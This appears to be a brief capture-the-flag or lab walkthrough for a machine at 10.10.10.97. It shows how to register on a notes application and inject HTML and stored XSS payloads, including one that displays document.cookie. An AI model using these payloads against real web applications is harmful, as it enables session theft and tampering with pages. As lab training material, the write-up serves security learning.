It's too easy and I didn't export the web application in this case. XSS is really simple.

1. Go to `http://10.10.10.97/login.php` and register a new user

2. login to it!

3. In the notes inject html tags

**HTML injection**
```
#title
title
#Note
<marquee>Mooooooviiiing</marquee>
```

**XSS**
```
#Title
Any title!
#Note
<scrip>alert("testing XSS")</script>
<script>alert(document.cookie)</script>
```
